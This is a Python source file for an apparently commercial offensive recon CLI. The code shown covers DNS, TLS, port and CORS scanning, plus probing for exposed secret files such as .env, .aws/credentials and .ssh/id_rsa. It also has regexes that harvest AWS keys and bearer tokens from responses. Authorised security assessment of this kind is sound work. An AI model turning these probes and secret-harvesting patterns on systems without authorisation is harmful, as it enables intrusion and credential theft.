#!/usr/bin/env python3
"""
ReconPro UNIFIED CLI — The Convergence
=======================================
All offensive modules fused into one entity.
One target. One encounter. Eight blades.

  ┌─ RECON          13-category surface reconnaissance
  ├─ AUTH BYPASS    15 auth bypass techniques
  ├─ CHAIN HUNTER   SSRF + redirect chain hunting
  ├─ BOT HUNTER     C2 / bot infrastructure detection
  ├─ GORGON ULTRA   15-stage AI red team
  ├─ OBLIVION       23-stage analytical dissolution
  ├─ VIBESEC        AI/vibe-coding vulnerability benchmark
  └─ NHI GRAPH      Non-Human Identity & blast-radius mapping

Subcommands:
    python3 reconpro.py auth login <api-key>    Store API credentials
    python3 reconpro.py auth status              Show auth status
    python3 reconpro.py auth logout              Remove credentials

Usage:
    python3 reconpro.py <target>
    python3 reconpro.py <target> --modules recon,auth,nhi,vibesec
    python3 reconpro.py <target> --all --output report.json --upload
    python3 reconpro.py <target> --insecure --dry-run
    python3 reconpro.py --list
    python3 reconpro.py vibesec <target>        Quick vibe-coding audit
"""
import argparse
import hashlib
import json
import os
import re
import secrets
import shlex
import socket
import ssl
import subprocess
import sys
import time
import uuid
import urllib.error
import urllib.parse
import urllib.request
import hmac
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple
from threading import Lock

# Rich for advanced visuals
from rich.console import Console, Group
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.columns import Columns
from rich.rule import Rule
from rich.tree import Tree
from rich.live import Live
from rich.layout import Layout

console = Console(width=120)

# ── Global Config ──────────────────────────────────────────────────────────

AUDIT_LOG_PATH = "/home/z/my-project/download/reconpro_audit.log"
_AUDIT_FAIL_WARNED = False


class _Config:
    """Runtime configuration flags — set once from CLI args."""
    verify_tls: bool = True
    insecure: bool = False
    confirm: bool = False
    dry_run: bool = False
    quiet: bool = False
    json_output: bool = False


CONFIG = _Config()

# ── m5: Thread-safe rate limiter ──────────────────────────────────────────

class _RateLimiter:
    """Token-bucket rate limiter — safe for concurrent use.

    Default: 10 requests per second. Use throttle.acquire() before any
    network call; it blocks until a token is available.
    """

    def __init__(self, max_per_second: float = 10.0):
        self._rate = max_per_second
        self._min_interval = 1.0 / max_per_second
        self._lock = Lock()
        self._last = 0.0

    def acquire(self) -> None:
        """Block until we're allowed to make the next request."""
        with self._lock:
            now = time.monotonic()
            elapsed = now - self._last
            if elapsed < self._min_interval:
                time.sleep(self._min_interval - elapsed)
            self._last = time.monotonic()


RATE_LIMITER = _RateLimiter(max_per_second=10.0)

# ── n1: IPv6 range classification ──────────────────────────────────────────

_IPV6_RESERVED_PREFIXES = ("fe80:", "fc", "fd", "::1", "::ffff", "2001:db8:", "::", "ff")
_IPV6_LINK_LOCAL_RE = re.compile(r'^fe80:', re.IGNORECASE)
_IPV6_UNIQUE_LOCAL_RE = re.compile(r'^(fc|fd)', re.IGNORECASE)
_IPV6_LOOPBACK_RE = re.compile(r'^::1$')
_IPV6_MAPPED_V4_RE = re.compile(r'^::ffff:', re.IGNORECASE)
_IPV6_DOC_RE = re.compile(r'^2001:db8:', re.IGNORECASE)
_IPV6_MULTICAST_RE = re.compile(r'^ff[0-9a-f]', re.IGNORECASE)


def classify_ipv6(addr: str) -> str:
    """Classify an IPv6 address. Returns: 'global', 'link_local', 'unique_local',
    'loopback', 'mapped_v4', 'documentation', 'multicast', 'unspecified'."""
    if addr == "::":
        return "unspecified"
    if _IPV6_LOOPBACK_RE.match(addr):
        return "loopback"
    if _IPV6_LINK_LOCAL_RE.match(addr):
        return "link_local"
    if _IPV6_UNIQUE_LOCAL_RE.match(addr):
        return "unique_local"
    if _IPV6_MAPPED_V4_RE.match(addr):
        return "mapped_v4"
    if _IPV6_DOC_RE.match(addr):
        return "documentation"
    if _IPV6_MULTICAST_RE.match(addr):
        return "multicast"
    return "global"

# ══════════════════════════════════════════════════════════════════════════════
# RECONPRO UNIFIED IDENTITY
# ══════════════════════════════════════════════════════════════════════════════

RECONPRO_NAME = "ReconPro UNIFIED"
RECONPRO_TAGLINE = "Eight Blades. One Target. One Verdict."
RECONPRO_VERSION = "reconpro-unified-v1.0"
RECONPRO_SIGNATURE = "X-R3c0nPr0-Un1f13d-S1x-Bl4d3s-0n3-T4rg3t-2026"

BANNER = r"""
██████╗ ███████╗ ██████╗██╗  ██╗███████╗██████╗ ███████╗██████╗ ██████╗ ██╗    ██╗
██╔══██╗██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗██╔════╝██╔════╝██║██╗ ██╔╝
██████╔╝█████╗  ██║     ███████║█████╗  ██████╔╝█████╗  ██║     ██╔╝██╗██║
██╔═══╝ ██╔══╝  ██║     ██╔══██║██╔══╝  ██╔══██╗██╔══╝  ██║     █████╔╝██║
██║     ███████╗╚██████╗██║  ██║███████╗██║  ██║███████╗╚██████╗██╔╝██╗██║
╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝
              E I G H T   B L A D E S .   O N E   T A R G E T .   O N E   V E R D I C T.
"""

MODULES = [
    {"id": "recon",    "name": "RECON",         "desc": "13-category surface reconnaissance",   "color": "cyan"},
    {"id": "auth",     "name": "AUTH BYPASS",   "desc": "15 auth bypass techniques",            "color": "yellow"},
    {"id": "chain",    "name": "CHAIN HUNTER",  "desc": "SSRF + redirect chain hunting",        "color": "magenta"},
    {"id": "bot",      "name": "BOT HUNTER",    "desc": "C2 / bot infrastructure detection",    "color": "red"},
    {"id": "gorgon",   "name": "GORGON ULTRA",  "desc": "15-stage AI red team",                 "color": "bright_red"},
    {"id": "oblivion", "name": "OBLIVION",      "desc": "23-stage analytical dissolution",       "color": "bright_magenta"},
    {"id": "vibesec",  "name": "VIBESEC",       "desc": "AI/vibe-coding vulnerability benchmark", "color": "bright_green"},
    {"id": "nhi",      "name": "NHI GRAPH",     "desc": "Non-Human Identity & blast-radius mapping", "color": "cyan"},
]

# ══════════════════════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def run_argv(argv: list, timeout: int = 8) -> Tuple[str, str]:
    """Execute a pre-parsed argv list without any shell interpretation."""
    try:
        r = subprocess.run(argv, shell=False, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip()
    except Exception:
        return "", ""


def run(cmd: str, timeout: int = 8) -> Tuple[str, str]:
    """Execute a command string safely via shlex.split — no /bin/sh spawned."""
    if CONFIG.dry_run:
        audit_log("subprocess.skip", detail=f"dry-run: {cmd[:120]}")
        return "", ""
    try:
        argv = shlex.split(cmd)
    except ValueError as e:
        audit_log("subprocess.shlex.error", status=type(e).__name__, detail=str(e))
        return "", ""
    if not argv:
        return "", ""
    return run_argv(argv, timeout=timeout)

def http_probe(url: str, method: str = "GET", body: Optional[bytes] = None,
               headers: Optional[Dict[str, str]] = None, timeout: int = 8) -> Dict[str, Any]:
    """Hardened single HTTP layer — all modules delegate through this."""
    RATE_LIMITER.acquire()  # m5: thread-safe rate limiting
    h = {
        "User-Agent": "ReconPro-Unified/1.0 (Six-Blades-One-Target; +https://reconpro.security)",
        "X-ReconPro-Signature": RECONPRO_SIGNATURE,
        "Accept": "application/json,text/plain,*/*",
    }
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=body, method=method, headers=h)
    try:
        ctx = ssl.create_default_context()
        if CONFIG.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read(8192)
            return {
                "ok": True, "status": resp.status, "reason": resp.reason,
                "headers": dict(resp.headers.items()),
                "body": raw.decode("utf-8", errors="replace")[:8192],
            }
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(8192)
            body_str = raw.decode("utf-8", errors="replace")[:8192]
        except Exception:
            body_str = ""
        return {
            "ok": False, "status": e.code, "reason": e.reason,
            "headers": dict(e.headers.items()) if e.headers else {},
            "body": body_str,
        }
    except Exception as e:
        return {"ok": False, "status": 0, "reason": str(e), "headers": {}, "body": ""}

# ── C3: JSON Lines audit log (injection-immune) ──────────────────────────

def audit_log(event: str, status: str = "ok", detail: str = "") -> None:
    """Append a JSON Lines record to the audit log. Injection-immune via json.dumps."""
    global _AUDIT_FAIL_WARNED
    record = {
        "ts": datetime.utcnow().isoformat() + "Z",
        "event": event,
        "status": status,
        "detail": detail,
    }
    try:
        os.makedirs(os.path.dirname(AUDIT_LOG_PATH) or ".", exist_ok=True)
        with open(AUDIT_LOG_PATH, "a") as f:
            f.write(json.dumps(record, ensure_ascii=False, separators=(",", ":")) + "\n")
    except Exception:
        if not _AUDIT_FAIL_WARNED:
            _AUDIT_FAIL_WARNED = True
            sys.stderr.write(f"[reconpro] WARNING: audit log write failed for {AUDIT_LOG_PATH}\n")

# ── M1: Confirm gate ──────────────────────────────────────────────────────

def _confirm_proceed(label: str) -> bool:
    """Prompt user for confirmation before destructive operations.
    Only activates when CONFIG.confirm is True AND not in dry-run mode.
    """
    if not CONFIG.confirm or CONFIG.dry_run:
        return True
    from rich.panel import Panel as _Panel
    from rich.text import Text as _Text
    try:
        console.print(_Panel(
            _Text(f"About to execute: {label}", style="bold yellow"),
            border_style="yellow",
            title="[bold]CONFIRM[/bold]",
            title_align="left",
            padding=(1, 2),
        ))
        answer = input("proceed? > ").strip().lower()
        return answer in ("y", "yes", "ok")
    except (EOFError, KeyboardInterrupt):
        return False

# ── VibeSec Grade Mapping ─────────────────────────────────────────────

VIBESEC_GRADE_MAP = [
    (90, "A+", "bright_green"),
    (80, "A",  "green"),
    (65, "B",  "yellow"),
    (50, "C",  "red"),
    (35, "D",  "bright_red"),
    (0,  "F",  "bold bright_red"),
]

VIBESEC_SENSITIVE_PATHS = [
    "/.env", "/.env.local", "/.env.production", "/.env.development",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    "/docker-compose.yml", "/docker-compose.yaml",
    "/config.json", "/config.yaml", "/config.yml",
    "/package.json", "/.npmrc",
    "/vercel.json", "/netlify.toml",
    "/firebase.json", "/firestore.rules",
    "/.vscode/settings.json", "/.idea/workspace.xml",
    # Stage 1 additions: AWS credentials, SSH keys, CI secrets
    "/.aws/credentials", "/.aws/config",
    "/.ssh/id_rsa", "/.ssh/id_ed25519", "/.ssh/authorized_keys",
    "/.github/workflows/secret", "/.gitlab-ci.yml",
    "/travis.yml", "/.circleci/config.yml",
]

VIBESEC_API_PATHS = [
    "/api/webhooks", "/api/trpc", "/api/v1/admin", "/api/v1/users",
    "/api/v1/config", "/api/internal", "/api/debug",
    "/api/graphql", "/api/stripe/webhook", "/api/upload",
    "/admin", "/admin/login", "/dashboard",
]

VIBESEC_ANON_KEY_PATTERNS = [
    ("supabase", re.compile(r'[\w-]*\.supabase\.co', re.I)),
    ("firebase", re.compile(r'[\w-]*\.firebaseapp\.com', re.I)),
    ("aws-s3", re.compile(r's3\.amazonaws\.com|s3-\w+-\d+\.amazonaws\.com', re.I)),
    ("cloudflare-r2", re.compile(r'[\w-]+\.r2\.cloudflarestorage\.com', re.I)),
    ("vercel-blob", re.compile(r'blob\.vercel-storage\.com', re.I)),
    ("gcp-storage", re.compile(r'storage\.googleapis\.com', re.I)),
    ("azure-blob", re.compile(r'[\w]+\.blob\.core\.windows\.net', re.I)),
]

VIBESEC_DB_ADMIN_PATHS = [
    "/phpmyadmin", "/phpmyadmin/", "/adminer", "/adminer.php",
    "/mongo-express", "/mongo-express/", "/_utils",
    "/pgadmin4", "/pgadmin/",
    "/redis-commander", "/redis-insight",
    "/prisma-studio", "/studio.apollo",
    "/graphql-playground", "/altair",
    "/db-browser", "/dbeaver",
]

VIBESEC_S3_LISTING_INDICATORS = [
    "ListBucketResult", "<Key>", "<Contents>", "Name</", "Prefix</",
    "<IsTruncated>", "listbucket", "BucketListing",
]

VIBESEC_SECURITY_HEADERS = [
    ("strict-transport-security", "HSTS", "high", 8),
    ("content-security-policy", "CSP", "medium", 6),
    ("x-content-type-options", "X-Content-Type-Options", "medium", 4),
    ("referrer-policy", "Referrer-Policy", "low", 3),
    ("permissions-policy", "Permissions-Policy", "low", 2),
]

VIBESEC_STORAGE_EXPOSURE_PATHS = [
    "/uploads/", "/static/uploads/", "/media/", "/files/",
    "/public/", "/assets/", "/images/",
]

VIBESEC_AUTH_PATTERN = re.compile(r'(?i)(unauthorized|forbidden|401|403|login required|authentication required|"error":.*auth)')

# ── NHI Graph: Identity & Over-Permission Patterns ──────────────────────

NHI_IDENTITY_PATTERNS = [
    # AWS IAM role ARN pattern
    ("aws_iam_role", re.compile(r'arn:aws:iam::\d+:role/[\w-]+', re.I)),
    # AWS IAM user
    ("aws_iam_user", re.compile(r'arn:aws:iam::\d+:user/[\w-]+', re.I)),
    # AWS access key format
    ("aws_access_key", re.compile(r'AKIA[0-9A-Z]{16}', re.I)),
    # GCP service account email
    ("gcp_service_account", re.compile(r'[\w.-]+@[\w.-]+\.iam\.gserviceaccount\.com', re.I)),
    # GCP project number
    ("gcp_project", re.compile(r'projects/\d+', re.I)),
    # Azure AD app registration / client ID (UUID format)
    ("azure_app_id", re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', re.I)),
    # Azure managed identity
    ("azure_managed_identity", re.compile(r'/subscriptions/[0-9a-f-]+/resourcegroups/[\w-]+/providers/Microsoft.ManagedIdentity', re.I)),
    # Generic API key patterns
    ("api_key_generic", re.compile(r'(?:api[_-]?key|apikey|secret[_-]?key|access[_-]?token)[\s]*[:=]\s*["\']?([\w\-]{20,})', re.I)),
    # Bearer tokens in responses
    ("bearer_token", re.compile(r'Bearer\s+eyJ[\w.-]+', re.I)),
    # Webhook secrets
    ("webhook_secret", re.compile(r'whsec_[\w]+|whsec_[\w-]+', re.I)),
]

NHI_OVERPERMISSION_PATTERNS = [
    ("wildcard_action", re.compile(r'\*|"Action":\s*"\*"', re.I)),
    ("wildcard_resource", re.compile(r'Resource":\s*"\*"|"\*"', re.I)),
    ("admin_wildcard", re.compile(r'AdministratorAccess|FullAccess|PowerUserAccess', re.I)),
    ("s3_full_bucket", re.compile(r's3:\*', re.I)),
    ("iam_passrole", re.compile(r'iam:PassRole', re.I)),
]


# ══════════════════════════════════════════════════════════════════════════════
# CLI AUTH & TELEMETRY
# ══════════════════════════════════════════════════════════════════════════════

CREDENTIALS_DIR = os.path.expanduser("~/.reconpro")
CREDENTIALS_FILE = os.path.join(CREDENTIALS_DIR, "credentials.json")
CONFIG_FILE = os.path.join(CREDENTIALS_DIR, "config.json")  # Primary config (auth validated)
TELEMETRY_ENDPOINT = "https://api.reconpro.io/api/v1/telemetry/upload"
AUTH_VALIDATE_ENDPOINT = "https://api.reconpro.io/api/v1/auth/validate"


def _load_credentials() -> Dict[str, str]:
    """Load stored credentials from ~/.reconpro/config.json (primary) or credentials.json (fallback)."""
    for path in [CONFIG_FILE, CREDENTIALS_FILE]:
        try:
            if os.path.exists(path):
                with open(path, "r") as f:
                    data = json.load(f)
                    if isinstance(data, dict) and "api_key" in data:
                        return data
        except Exception as e:
            audit_log("credentials.load.error", status=type(e).__name__, detail=str(e)[:120])
    return {}


def _save_credentials(data: Dict[str, str], primary: bool = True) -> bool:
    """Save credentials to ~/.reconpro/config.json (primary) or credentials.json (fallback).
    When primary=True, also writes to credentials.json for backward compat."""
    target = CONFIG_FILE if primary else CREDENTIALS_FILE
    try:
        os.makedirs(CREDENTIALS_DIR, mode=0o700, exist_ok=True)
        fd = os.open(target, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w") as f:
            json.dump(data, f, indent=2)
        audit_log("credentials.saved", detail=f"api_key stored at {target}")
        # Write to fallback too if primary
        if primary and target != CREDENTIALS_FILE:
            try:
                fd2 = os.open(CREDENTIALS_FILE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
                with os.fdopen(fd2, "w") as f2:
                    json.dump(data, f2, indent=2)
            except Exception:
                pass  # best-effort fallback
        return True
    except Exception as e:
        audit_log("credentials.save.error", status=type(e).__name__, detail=str(e)[:120])
        return False


def _delete_credentials() -> bool:
    """Remove stored credentials from both config.json and credentials.json."""
    success = True
    for path in [CONFIG_FILE, CREDENTIALS_FILE]:
        try:
            if os.path.exists(path):
                os.remove(path)
        except Exception as e:
            audit_log("credentials.delete.error", status=type(e).__name__, detail=str(e)[:120])
            success = False
    return success


def cmd_auth_login(api_key: str) -> None:
    """Authenticate and store API key locally. Optionally validates against control plane."""
    if not api_key or len(api_key) < 8:
        console.print("[red]Invalid API key. Must be at least 8 characters.[/]")
        return
    creds_data = {"api_key": api_key, "stored_at": datetime.utcnow().isoformat() + "Z"}
    # Attempt online validation if network is available (best-effort)
    try:
        validate_resp = http_probe(AUTH_VALIDATE_ENDPOINT, method="POST",
                                    body=json.dumps({"api_key": api_key}).encode(),
                                    headers={"Content-Type": "application/json"}, timeout=5)
        if validate_resp.get("status") == 200 and validate_resp.get("ok"):
            vdata = json.loads(validate_resp.get("body", "{}"))
            if vdata.get("valid"):
                creds_data["org_id"] = vdata.get("org_id", "")
                creds_data["quota_remaining"] = vdata.get("quota_remaining", 0)
                creds_data["scopes"] = vdata.get("scopes", [])
                creds_data["validated"] = True
                console.print(f"[green]Authenticated.[/] API key validated against control plane.")
                console.print(f"  Key prefix: {api_key[:8]}...{api_key[-4:]}")
                console.print(f"  Quota remaining: [bold]{vdata.get('quota_remaining', '?')}[/]")
                console.print(f"  Org ID: [dim]{vdata.get('org_id', '?')}[/]")
                console.print(f"  Stored at: {CONFIG_FILE}")
                _save_credentials(creds_data)
                return
    except Exception:
        pass  # Offline — store locally without validation
    if not _save_credentials(creds_data):
        console.print("[red]Failed to save credentials.[/]")
        return
    console.print(f"[yellow]Authenticated (offline).[/] API key stored at {CONFIG_FILE}")
    console.print(f"  Key prefix: {api_key[:8]}...{api_key[-4:]}")
    console.print(f"  [dim]Run with network access to validate against control plane.[/]")


def cmd_auth_status() -> None:
    """Show current authentication status."""
    creds = _load_credentials()
    if creds and "api_key" in creds:
        key = creds["api_key"]
        validated = creds.get("validated", False)
        org_id = creds.get("org_id", "")
        quota = creds.get("quota_remaining", "?")
        stored = creds.get("stored_at", "unknown")
        status_color = "green" if validated else "yellow"
        console.print(f"[{status_color}]{'Authenticated (validated)' if validated else 'Authenticated (offline)'}.[/]")
        console.print(f"  Key prefix: [bold]{key[:8]}...{key[-4:]}[/]")
        console.print(f"  Stored at: [dim]{stored}[/]")
        console.print(f"  Config file: [dim]{CONFIG_FILE}[/]")
        if org_id:
            console.print(f"  Org ID: [dim]{org_id}[/]")
        console.print(f"  Quota remaining: [bold]{quota}[/]")
        scopes = creds.get("scopes", [])
        if scopes:
            console.print(f"  Scopes: [dim]{', '.join(scopes)}[/]")
    else:
        console.print("[yellow]Not authenticated.[/] No API key found.")
        console.print(f"  Run: [cyan]reconpro.py auth login <api-key>[/]")


def cmd_auth_logout() -> None:
    """Remove stored credentials from both config.json and credentials.json."""
    if _delete_credentials():
        console.print("[green]Logged out.[/] Credentials removed from ~/.reconpro/")
    else:
        console.print("[red]Failed to remove credentials.[/]")


def _sign_report(report: Dict[str, Any]) -> str:
    """HMAC-SHA256 sign a report for tamper-proof telemetry."""
    creds = _load_credentials()
    api_key = creds.get("api_key", "")
    canonical = json.dumps(report, sort_keys=True, separators=(",", ":"), ensure_ascii=False)
    signature = hmac.new(api_key.encode(), canonical.encode(), hashlib.sha256).hexdigest()
    return signature


def _upload_telemetry(report: Dict[str, Any]) -> bool:
    """POST signed report to telemetry endpoint. Returns True on success."""
    creds = _load_credentials()
    if not creds.get("api_key"):
        audit_log("telemetry.skip", detail="no api_key configured")
        return False
    signature = _sign_report(report)
    payload = json.dumps({
        "report": report,
        "signature": signature,
        "api_key_prefix": creds["api_key"][:8],
    }).encode()
    try:
        RATE_LIMITER.acquire()
        req = urllib.request.Request(
            TELEMETRY_ENDPOINT,
            data=payload,
            method="POST",
            headers={
                "Content-Type": "application/json",
                "User-Agent": f"ReconPro-Unified/{RECONPRO_VERSION}",
                "X-ReconPro-Signature": RECONPRO_SIGNATURE,
                "Authorization": f"Bearer {creds['api_key']}",
            },
        )
        ctx = ssl.create_default_context()
        if CONFIG.insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            if resp.status < 300:
                audit_log("telemetry.upload.ok", detail=f"status={resp.status}")
                return True
            else:
                audit_log("telemetry.upload.error", detail=f"status={resp.status}")
                return False
    except Exception as e:
        audit_log("telemetry.upload.error", status=type(e).__name__, detail=str(e)[:120])
        return False


def _save_local_fallback(report: Dict[str, Any]) -> str:
    """Save report locally when upload fails — graceful offline fallback."""
    os.makedirs("/home/z/my-project/download", exist_ok=True)
    safe_host = _safe_filename(report.get("target", "unknown"))
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    path = f"/home/z/my-project/download/reconpro_pending_{safe_host}_{ts}.json"
    try:
        with open(path, "w") as f:
            json.dump(report, f, indent=2, default=str)
        audit_log("telemetry.fallback.saved", detail=path)
        return path
    except Exception as e:
        audit_log("telemetry.fallback.error", status=type(e).__name__, detail=str(e)[:120])
        return ""


def upload_report(report: Dict[str, Any]) -> None:
    """Attempt telemetry upload with graceful offline fallback."""
    console.print(f"\n  [cyan]Telemetry:[/] Attempting upload to {TELEMETRY_ENDPOINT}...")
    if _upload_telemetry(report):
        console.print(f"  [green]Upload successful.[/] Report synced to cloud.")
    else:
        local_path = _save_local_fallback(report)
        if local_path:
            console.print(f"  [yellow]Upload failed (offline/no-key).[/] Saved locally: [bold]{local_path}[/]")
            console.print(f"  [dim]Re-upload later with: reconpro.py <target> --upload[/]")
        else:
            console.print(f"  [red]Upload failed and local save failed. Report may be lost.[/]")


def generate_encounter_id(host: str) -> str:
    """Generate a globally unique encounter ID. Uses uuid4 — no collision window."""
    raw = uuid.uuid4().hex[:12].upper()
    return f"RPU-{raw}"

# ══════════════════════════════════════════════════════════════════════════════
# MODULE 1: RECON — 13-category surface reconnaissance
# ══════════════════════════════════════════════════════════════════════════════

def module_recon(host: str) -> Dict[str, Any]:
    """13-category surface reconnaissance."""
    findings: List[Dict[str, Any]] = []
    categories_run: List[str] = []

    def add(title, severity, category, description, evidence):
        findings.append({
            "title": title, "severity": severity, "category": category,
            "description": description, "evidence": evidence, "asset": host,
        })

    # 1. DNS
    categories_run.append("DNS Enumeration")
    out, _ = run(f"dig +short +time=3 +tries=1 {host} A")
    a_records = [l.strip() for l in out.split('\n') if l.strip() and re.match(r'^\d+\.\d+', l)]
    if a_records:
        add(f"DNS A Record — {len(a_records)} IPv4 address(es)", "info", "dns",
            f"Domain resolves to {len(a_records)} IPv4: {', '.join(a_records[:5])}",
            f"A: {', '.join(a_records[:5])}")
    out, _ = run(f"dig +short +time=3 +tries=1 {host} AAAA")
    aaaa = [l.strip() for l in out.split('\n') if l.strip()]
    if aaaa:
        v6_classes = {classify_ipv6(a) for a in aaaa}
        private_count = sum(1 for c in v6_classes if c != "global")
        scope_note = f" ({len(v6_classes)} scope classes: {', '.join(sorted(v6_classes))})" if len(v6_classes) > 1 else ""
        if private_count:
            add(f"DNS AAAA — {len(aaaa)} IPv6, {private_count} non-global{scope_note}", "medium", "dns",
                f"IPv6: {', '.join(aaaa[:3])}", f"AAAA: {aaaa[0]}")
        else:
            add(f"DNS AAAA — {len(aaaa)} global IPv6{scope_note}", "info", "dns",
                f"IPv6: {', '.join(aaaa[:3])}", f"AAAA: {aaaa[0]}")
    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} MX")
    mx = [l.strip() for l in out.split('\n') if 'MX' in l]
    if mx:
        add(f"MX Records — {len(mx)} mail server(s)", "info", "dns", f"{len(mx)} mail servers", "; ".join(mx[:3]))
    out, _ = run(f"dig +noall +answer +time=3 +tries=1 {host} NS")
    ns = [l.strip() for l in out.split('\n') if 'NS' in l]
    if ns:
        add(f"NS Records — {len(ns)} nameserver(s)", "info", "dns", f"{len(ns)} nameservers", "; ".join(ns[:3]))
    out, _ = run(f"dig +short +time=3 +tries=1 {host} TXT")
    txt_lines = [l for l in out.split('\n') if l.strip()]
    if txt_lines:
        spf = [t for t in txt_lines if 'spf' in t.lower()]
        add(f"TXT Records — {len(txt_lines)} ({len(spf)} SPF)", "info", "dns",
            f"{len(txt_lines)} TXT records, {len(spf)} SPF", "; ".join(txt_lines[:3]))

    # 2. HTTP Headers
    categories_run.append("HTTP Security Headers")
    r = http_probe(f"https://{host}/")
    if r["status"]:
        hdrs = r["headers"]
        sec_headers = ["strict-transport-security", "content-security-policy", "x-frame-options",
                       "x-content-type-options", "referrer-policy", "permissions-policy"]
        present = [h for h in sec_headers if h in hdrs]
        missing = [h for h in sec_headers if h not in hdrs]
        for h in missing:
            add(f"Missing security header: {h}", "medium", "headers",
                f"The {h} header is not set. This leaves users vulnerable to specific client-side attacks.",
                f"Header {h} absent from response")
        for h in present:
            add(f"Security header present: {h}", "info", "headers",
                f"{h} is set: {hdrs[h][:80]}", f"{h}: {hdrs[h][:80]}")
        server = hdrs.get("server", "")
        if server:
            add(f"Server header disclosure: {server}", "low", "headers",
                f"Server software disclosed: {server}", f"Server: {server}")
        # Tech fingerprint
        for sig in ["cloudflare", "nginx", "apache", "gunicorn", "envoy", "istio", "aws", "gcp"]:
            if sig in json.dumps(hdrs).lower():
                add(f"Tech fingerprint: {sig}", "info", "headers", f"Signal {sig} detected in headers", sig)

    # 3. TLS Certificate
    categories_run.append("TLS Certificate Analysis")
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                if cert:
                    subject = dict(x[0] for x in cert.get("subject", []))
                    issuer = dict(x[0] for x in cert.get("issuer", []))
                    not_after = cert.get("notAfter", "")
                    add(f"TLS Certificate — {subject.get('commonName', 'unknown')}", "info", "tls",
                        f"Issued by {issuer.get('commonName', 'unknown')}, expires {not_after}",
                        f"CN={subject.get('commonName', '')}, issuer={issuer.get('commonName', '')}")
    except Exception as e:
        add(f"TLS handshake failed: {str(e)[:60]}", "medium", "tls", str(e)[:100], str(e)[:100])

    # 4. Subdomain enumeration (passive via crt.sh)
    categories_run.append("Subdomain Enumeration")
    try:
        r2 = http_probe(f"https://crt.sh/?q=%.{host}&output=json", timeout=10)
        if r2["status"] == 200 and r2["body"]:
            data = json.loads(r2["body"])
            subs = set()
            for d in data[:200]:
                name = d.get("name_value", "")
                for n in name.split('\n'):
                    if n.endswith(host) and '*' not in n:
                        subs.add(n.strip())
            if subs:
                add(f"Subdomain enumeration — {len(subs)} found via crt.sh", "info", "subdomain",
                    f"{len(subs)} unique subdomains discovered", "; ".join(list(subs)[:5]))
    except Exception as e:
        audit_log("recon.subdomain.error", status=type(e).__name__, detail=str(e)[:120])

    # 5. Robots.txt
    categories_run.append("Robots.txt Analysis")
    r = http_probe(f"https://{host}/robots.txt")
    if r["status"] == 200 and r["body"]:
        lines = [l.strip() for l in r["body"].split('\n') if l.strip()]
        disallows = [l for l in lines if l.lower().startswith('disallow')]
        if disallows:
            add(f"robots.txt — {len(disallows)} Disallow rules", "info", "robots",
                f"{len(disallows)} paths disallowed", "; ".join(disallows[:5]))

    # 6. Sitemap
    categories_run.append("Sitemap Analysis")
    r = http_probe(f"https://{host}/sitemap.xml")
    if r["status"] == 200 and r["body"]:
        urls = re.findall(r'<loc>([^<]+)</loc>', r["body"])
        if urls:
            add(f"sitemap.xml — {len(urls)} URLs", "info", "sitemap",
                f"{len(urls)} URLs exposed in sitemap", "; ".join(urls[:3]))

    # 7. Common paths
    categories_run.append("Common Path Probing")
    for path in ["/.env", "/.git/config", "/wp-admin", "/admin", "/api", "/v1", "/.well-known/security.txt",
                 "/server-status", "/phpinfo.php", "/actuator", "/metrics"]:
        r = http_probe(f"https://{host}{path}", timeout=4)
        if r["status"] not in (0, 404) and r["status"] < 500:
            sev = "critical" if path in ["/.env", "/.git/config"] else ("high" if path in ["/wp-admin", "/admin"] else "info")
            add(f"Path exposed: {path} (HTTP {r['status']})", sev, "paths",
                f"{path} returned HTTP {r['status']}", f"GET {path} → {r['status']}")

    # 8. Open ports (top 12)
    categories_run.append("Port Scan (top 12)")
    try:
        ip = socket.gethostbyname(host)
        for port in [21, 22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                result = s.connect_ex((ip, port))
                if result == 0:
                    add(f"Open port: {port}/tcp", "medium" if port in [21, 25, 3306, 5432, 6379, 9200, 27017] else "info",
                        "ports", f"Port {port}/tcp is open", f"{ip}:{port} OPEN")
                s.close()
            except Exception:
                pass
    except Exception:
        pass

    # 9. Email security (DMARC, DKIM)
    categories_run.append("Email Security (DMARC/DKIM)")
    out, _ = run(f"dig +short +time=3 +tries=1 _dmarc.{host} TXT")
    if out:
        add(f"DMARC record present", "info", "email", f"DMARC: {out[:100]}", out[:100])
    else:
        add("DMARC record missing", "medium", "email", "No DMARC record found — domain vulnerable to email spoofing", "DMARC query empty")

    # 10. CORS
    categories_run.append("CORS Analysis")
    r = http_probe(f"https://{host}/", headers={"Origin": "https://evil.example.com"})
    if r["status"]:
        acao = r["headers"].get("access-control-allow-origin", "")
        if acao == "*" or "evil" in acao:
            add("Wildcard / reflected CORS origin", "high", "cors",
                f"Access-Control-Allow-Origin: {acao} — allows arbitrary origins",
                f"ACAO: {acao}")

    # 11. Cookie security
